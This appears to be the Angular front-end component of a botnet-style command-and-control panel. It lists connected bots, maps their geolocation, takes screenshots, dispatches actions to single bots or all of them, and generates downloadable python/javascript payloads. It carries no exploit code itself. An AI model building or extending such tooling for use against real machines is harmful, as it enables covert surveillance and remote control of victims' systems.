import { HttpClient } from '@angular/common/http';
import { ChangeDetectorRef, Component, EventEmitter, HostListener, OnInit, Output } from '@angular/core';
import { ActionDto } from 'models/ActionDto';

import { Utils } from 'utils/utils';
import { FormGroup, Validators, FormBuilder } from '@angular/forms';
import { environment } from 'environments/environment';
import { BotWebSocketService } from '@services/BotWebSocketService';
import { ToastrService } from 'ngx-toastr';
import { BotDto } from 'models/BotDto';
import { UpdateTaskEventDto } from 'models/UpdateTaskEventDto';
import { ActionTypeDto } from 'models/ActionTypeDto';
import { HeartBeatEventDto } from 'models/HeartBeatEventDto';
import { DomSanitizer } from '@angular/platform-browser';
import { TranslateService } from '@ngx-translate/core';
import * as L from 'leaflet';
import 'leaflet.markercluster';

const markerIcon: string = 'assets/marker.png';
const activeMarkerIcon: string = 'assets/marker-active.png';

@Component({
    selector: 'app-frontpage',
    templateUrl: './frontpage.component.html',
    styleUrls: ['./frontpage.component.css']
})
export class FrontpageComponent implements OnInit {
    form!: FormGroup;
    payloadForm!: FormGroup;

    bots: BotDto[] = [];
    filterCurrentBots: Boolean = false;
    selectedBot: BotDto = {} as BotDto;
    paramEntries: Array<[string, any]> = [];

    actionTypes: ActionTypeDto[] = [];
    payloadTypes: string[] = ['python', 'javascript'];

    isModalOpen = false;
    isActionModalOpen = false;
    isPayloadGenModalOpen = false;
    allBotsSelected = false;
    isFloatingMenuOpen = false;

    map: any;
    markers: any;

    @Output() actionSubmitted: EventEmitter<ActionDto> = new EventEmitter<ActionDto>();

    formData: ActionDto = {
        selectedBots: [],
        actionType: '',
        parameters: new Map<string, any>(),
    };

    payloadFormData: any = {
        payloadType: '',
        payloadUrl: '',
    };

    constructor(
        private fb: FormBuilder,
        private http: HttpClient,
        private botWebSocketService: BotWebSocketService,
        private toastr: ToastrService,
        private cdr: ChangeDetectorRef,
        private sanitizer: DomSanitizer,
        public translate: TranslateService) {
        this.paramEntries = this.getFormDataParameterEntries();
    }

    ngOnInit(): void {
        this.form = this.fb.group({
            selectedBots: [this.formData.selectedBots, Validators.minLength(1)],
            actionType: [this.formData.actionType, Validators.required],
            parameters: [this.formData.parameters, Validators.required],
        });
        this.payloadForm = this.fb.group({
            payloadType: [this.formData.selectedBots, Validators.required],
            payloadUrl: [this.formData.actionType, Validators.required],
        });
        // Initialize formData with default values
        this.actionTypes = Utils.getActionTypes();
        // initialize default payload url from backend
        this.getDefaultPayloadUrlTarget();

        this.botWebSocketService.getUpdates().subscribe(update => {
            if (Array.isArray(update)) {
                // pass entire bot list arriving to system
                this.bots = update;
            }
            else if (Utils.instanceOfBotDto(update)) {
                let botDto = update as BotDto;
                // pass entire bot arriving to system
                let index = this.bots.findIndex((bot: BotDto) => bot.id === botDto.id);
                if (index === -1) {
                    this.bots.push(botDto);
                }
                else {
                    this.bots[index] = botDto;
                }
            }
            else if (Utils.instanceOfUpdateTaskEventDto(update)) {
                // pass taskDto update arriving to system
                // this is a single task info update
                let uteDto = update as UpdateTaskEventDto;
                // find bot index
                let index = this.bots.findIndex(bot => bot.id == uteDto.botId);
                //add result to task index
                let taskIndex = this.bots[index].tasks.findIndex(task => task.id === uteDto.taskId);
                let bot = this.bots[index];
                if (!!bot && !!bot.tasks[taskIndex]) {
                    let task = bot.tasks[taskIndex];
                    bot.tasks[taskIndex].result = uteDto.result;
                    if (task.actionType === 'geolocation') {
                        let newGeolocation = uteDto.result;
                        if (!!newGeolocation && newGeolocation.split(',').length === 2)
                            bot.geolocation = update.result;
                    }
                }

            }
            else if (Utils.instanceOfHeartBeatEventDto(update)) {
                // pass heart beat event arriving to system
                // this is a heart beat
                let heartDto = update as HeartBeatEventDto;
                let index = this.bots.findIndex(bot => bot.id == heartDto.botId);
                if (index >= -1) {
                    this.bots[index].lastSignal = heartDto.lastSignal;
                }
            }
            this.refreshMapPoints();
        });

        setTimeout(() => {
            this.initMap();
        }, 0);
    }

    initMap() {
        const mapDiv = document.getElementById('map');
        if (mapDiv && !mapDiv.hasAttribute('data-leaflet-initialized')) {
            mapDiv.setAttribute('data-leaflet-initialized', 'true');
            this.map = L.map('map').setView([40.4168, -3.7038], 5); // Centrado en España

            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '&copy; OpenStreetMap contributors'
            }).addTo(this.map);
        }
    }

    clearMarkers = () => {
        console.log("Clearing markers, current size: " + (this.markers ? this.markers.getLayers().length : 0));
        if (this.markers)
            this.markers.clearLayers();
        console.log("Markers clear, new size: " + (this.markers ? this.markers.getLayers().length : 0));
    }

    refreshMapPoints = () => {
        if (this.bots.length > 0) {
            // removing all points from map
            const mapDiv = document.querySelector('#map');
            if (mapDiv && !!this.map) {
                // Use marker cluster group from leaflet.markercluster plugin
                if (!this.markers) {
                    this.markers = L.featureGroup();
                    this.map.addLayer(this.markers);
                }
                this.clearMarkers();

                // center points on marks created
                this.bots.forEach((bot: BotDto) => {
                    let geolocation = bot.geolocation.split(',');
                    if (bot.geolocation && geolocation.length === 2) {
                        let lat = parseFloat(geolocation[0]);
                        let lng = parseFloat(geolocation[1]);
                        const marker = L.marker([lat, lng]);
                        let iconUrl = bot.lastSignal >= Date.now() - 5 * 60 * 1000 ? activeMarkerIcon : markerIcon;
                        marker.setIcon(new L.Icon({
                            iconUrl: iconUrl, 
                            className: "marker-icon",
                            iconSize: [25, 41],
                            iconAnchor: [13, 41],
                            popupAnchor: [13, 0]
                        }));
                        marker.bindPopup(`<b>${bot.name}</b>`);
                        marker.addTo(this.markers);
                    }
                }
                );
                this.map.fitBounds(this.bots.length > 0 ? this.markers.getBounds().pad(0.5) : this.markers.getBounds());
            }
        }
    }

    submitForm = () => {
        const parametersObj: Record<string, any> = {};
        this.formData.parameters.forEach((val: string, key: any) => {
            parametersObj[key] = val;
        });
        this.form.setValue({
            // If all bots are selected, we send empty to communicate broadcast to all bots
            selectedBots: this.formData.selectedBots.length === this.bots.length ? [] : this.formData.selectedBots,
            actionType: this.formData.actionType,
            parameters: parametersObj
        });
        if (this.form.valid) {
            this.postRequestData({ ...this.form.value });
        } else
            this.toastr.error("Error detected in fields validation, please check the form and try again");
    }


    submitPayloadForm = () => {
        this.payloadForm.setValue({
            payloadType: this.payloadFormData.payloadType,
            payloadUrl: this.payloadFormData.payloadUrl,
        });
        if (this.payloadForm.valid) {
            this.emmitPayloadDownload({ ...this.payloadForm.value });
        } else
            this.toastr.error("Error detected in fields validation, please check the form and try again");
    }

    deleteBot = (botId: string) => {
        this.http.delete<any>(`${environment.apiUrl}/bot/${botId}`)
            .subscribe(
                data => {
                    this.toastr.success('Bot deleted', "Bot " + botId + " deleted successfully");
                    // Remove bot from local list
                    this.bots = this.bots.filter(bot => bot.id !== botId);
                },
                error => {
                    this.toastr.error('An error occurred', "Error occurred while deleting bot " + botId + ", check console for more information");
                    console.error('Error:', error);
                }
            );
    }

    getFormDataParameterEntries = () => {
        return Array.from(this.formData.parameters.entries());
    }


    updateActionType = (event: any) => {
        const actionTypeValue = event.target.value;
        // we copy the map parameters from the actionTypes object
        this.formData.parameters = new Map<string, any>();
        let actionTypeDto = this.actionTypes.find((action: any) => action.value === actionTypeValue);
        if (!!actionTypeDto && !!actionTypeDto.parameters) {
            // Convert the parameters object to a Map
            for (const key of actionTypeDto.parameters.keys()) {
                let value = actionTypeDto.parameters.get(key);
                console.log(key, value);
                this.formData.parameters.set(key, value);
            }
            this.paramEntries = this.getFormDataParameterEntries();
        }
        this.cdr.detectChanges();
    }

    getParameterEntries = () => {
        return Array.from(this.formData.parameters.entries());
    }

    updateMapValue(event: any, key: any) {
        let val = event.target.value;
        this.formData.parameters.set(key, val);
    }

    selectAllBots = () => {
        if (this.formData?.selectedBots.length === this.bots.length) {
            this.formData.selectedBots = [];
        }
        else {
            this.formData.selectedBots = this.bots.map((bot: BotDto) => bot.id);
        }
        this.allBotsSelected = this.formData?.selectedBots.length === this.bots.length;
    }

    selectBot = (botId: string) => {
        if (this.formData?.selectedBots.includes(botId)) {
            this.formData.selectedBots = this.formData?.selectedBots.filter((bot) => bot !== botId);
        }
        else {
            this.formData?.selectedBots.push(botId);
        }
        this.allBotsSelected = this.formData?.selectedBots.length === this.bots.length;
    }

    openModal = () => {
        this.isModalOpen = true;
        this.formData = {
            ...this.formData,
            actionType: '',
            parameters: new Map<string, any>(),
        };
    }

    openActionsModal = (botId: string) => {
        this.selectedBot = this.bots.find((bot: BotDto) => bot.id === botId) || {} as BotDto;
        if (!!this.selectedBot)
            this.isActionModalOpen = true;
    }

    openPayloadGenModal = () => {
        this.isPayloadGenModalOpen = true;
    }

    toggleResultsTimeLimit = () => {
        this.filterCurrentBots = !this.filterCurrentBots;
    }

    getBots = () => {
        return this.bots;
    }

    getActiveBots = () => {
        return this.bots.filter((bot: BotDto) => bot.lastSignal >= Date.now() - 5 * 60 * 1000);
    }

    closeModal = () => {
        this.isModalOpen = false;
    }

    closeActionsModal = () => {
        this.isActionModalOpen = false;
    }

    closePayloadGenModal = () => {
        this.isPayloadGenModalOpen = false;
    }

    cleanAndClosePayloadGenModal = () => {
        this.isPayloadGenModalOpen = false;
        this.payloadFormData = {
            payloadType: '',
            payloadUrl: '',
        };
        const selectedBotsParam = this.formData.selectedBots;
        this.payloadForm.reset();
        this.payloadFormData.selectedBots = selectedBotsParam;
        this.getDefaultPayloadUrlTarget();
        this.closePayloadGenModal();
        this.cdr.detectChanges();
    }

    cleanAndCloseActionModal = () => {
        this.isActionModalOpen = false;
        this.formData = {
            selectedBots: [],
            actionType: '',
            parameters: new Map<string, any>(),
        };
        this.form.reset();
        this.paramEntries = this.getFormDataParameterEntries();
        this.allBotsSelected = false;
        this.closeModal();
        this.cdr.detectChanges();
    }

    /** * Checks the type of an object and returns a string indicating its type (object, string or array of strings).
     * @param object The object to check.
     * @returns A string indicating the type of the object.
     */
    checkObjectType = (object: any): string => {
        if (typeof object === 'string') {
            return 'string';
        }
        else if (Array.isArray(object)) {
            return 'array';
        }
        return 'object';
    }

    convertResult = (item: any): any => {
        try {
            return JSON.parse(item);
        } catch (e) {
            return item;
        }
    }

    /** * Decodes a base64 string to a safe resource URL for image display.
     * @param base64String The base64 string of the image.
     * @returns A sanitized resource URL for the image.
     */
    decodeBase64Img = (base64String: string) => {
        return this.sanitizer.bypassSecurityTrustResourceUrl(
            `data:image/png;base64, ${base64String}`
        );
    }

    /**
     * Downloads the image from a base64 string.
     * @param base64String The base64 string of the image.
     */
    downloadImage = (base64String: string) => {
        const blob = this.dataURItoBlob(base64String);
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'screenshot.png';
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
    }

    /**
     * Converts a base64 string to a Blob object.
     * @param base64String The base64 string to convert.
     * @returns A Blob object representing the image.
     */
    dataURItoBlob = (base64String: string) => {
        var dataURI = `data:image/png;base64, ${base64String}`;
        // convert base64 to raw binary data held in a string
        // doesn't handle URLEncoded DataURIs - see SO answer #6850276 for code that does this
        var byteString = atob(dataURI.split(',')[1]);

        // separate out the mime component
        var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0]

        // write the bytes of the string to an ArrayBuffer
        var ab = new ArrayBuffer(byteString.length);

        // create a view into the buffer
        var ia = new Uint8Array(ab);

        // set the bytes of the buffer to the correct values
        for (var i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }

        // write the ArrayBuffer to a blob, and you're done
        var blob = new Blob([ab], { type: mimeString });
        return blob;
    }

    /* 
      Post request of data
    */
    postRequestData = (data: ActionDto) => {
        this.http.post<any>(`${environment.apiUrl}/process`, data)
            .subscribe(
                data => {
                    this.toastr.success('Action sent', "Action sent to bot " + data.selectedBots + " successfully");
                    // Clean and close modal
                    this.cleanAndCloseActionModal();
                },
                error => {
                    this.toastr.error('An error occurred', "Error occurred while sending an order to bot " + data.selectedBots + ", check console for more information");
                    console.error('Error:', error);
                }
            );
    }
    // Payload request default url from backend
    getDefaultPayloadUrlTarget = () => {
        this.http.get<any>(`${environment.apiUrl}/payload/url`)
            .subscribe(
                data => {
                    this.payloadFormData.payloadUrl = data.payloadUrl;
                },
                error => {
                    this.toastr.error('An error occurred', "Error occurred while obtaining default payload url, check console for more information");
                    console.error('Error:', error);
                }
            );
    }
    // Payload download request
    emmitPayloadDownload = (data: any) => {
        this.http.post(`${environment.apiUrl}/payload/download`, data, { responseType: 'blob' })
            .subscribe(
                (response: Blob) => {
                    // Create a download link for the blob
                    const blob = new Blob([response]);
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    document.body.appendChild(a);
                    a.style.display = 'none';
                    a.href = url;
                    a.download = 'payload.zip'; // Set the file name here
                    a.click();
                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(a);

                    this.toastr.success('Payload download initiated', "Payload download initiated successfully");
                    // Clean and close modal
                    this.cleanAndClosePayloadGenModal();
                },
                error => {
                    this.toastr.error('An error occurred', "Error occurred while downloading payload, check console for more information");
                    console.error('Error:', error);
                }
            );
    }

    switchLanguage() {
        this.translate.use(this.translate.currentLang === 'es-ES' ? 'en-US' : 'es-ES');
    }

    @HostListener('document:click', ['$event'])
    onDocumentClick(event: MouseEvent) {
        const target = event.target as HTMLElement;
        // Si el menú está abierto y el clic no fue dentro del menú ni en el botón trigger
        if (
            this.isFloatingMenuOpen &&
            !target.closest('.floating-menu') &&
            !target.closest('.floating-menu-trigger')
        ) {
            this.isFloatingMenuOpen = false;
        }
    }
}